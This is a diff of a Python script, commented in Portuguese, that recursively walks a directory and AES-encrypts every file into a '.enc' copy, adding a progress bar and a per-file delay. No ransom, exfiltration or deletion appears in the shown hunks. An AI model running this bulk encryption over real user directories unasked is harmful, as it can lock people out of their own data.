@@ -1,6 +1,8 @@
 import os
+import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
+from tqdm import tqdm
 
 def encrypt_file(file_path, key):
     """Criptografa o arquivo com a chave fornecida e salva o arquivo criptografado."""
@@ -10,9 +12,6 @@ def encrypt_file(file_path, key):
         data = f.read()
 
     encrypted_data = cipher.encrypt(pad(data, AES.block_size))
-
-    if file_path.endswith(".enc"):
-        return
 
     encrypted_file_path = file_path + ".enc"
     with open(encrypted_file_path, "wb") as f:
@@ -25,13 +24,13 @@ def encrypt_file(file_path, key):
 
 
 def scan_and_encrypt(directory, key):
-    """Scan a directory and process each file."""
-    print(f"Scanning directory: {directory}")
+    """Escaneia o diretório e criptografa os arquivos"""
+    files_to_encrypt = []
     for root, _, files in os.walk(directory):
         for file in files:
-            file_path = os.path.join(root, file)
-            try:
-                encrypt_file(file_path, key)
-            except Exception as e:
-                print(f"Error processing {file_path}: {e}")
+            if not file.endswith('.enc'):
+                files_to_encrypt.append(os.path.join(root, file))   
 
+    for file_path in tqdm(files_to_encrypt, desc="Criptografando arquivos", unit="arquivo"):
+        encrypt_file(file_path, key)
+        time.sleep(0.1)
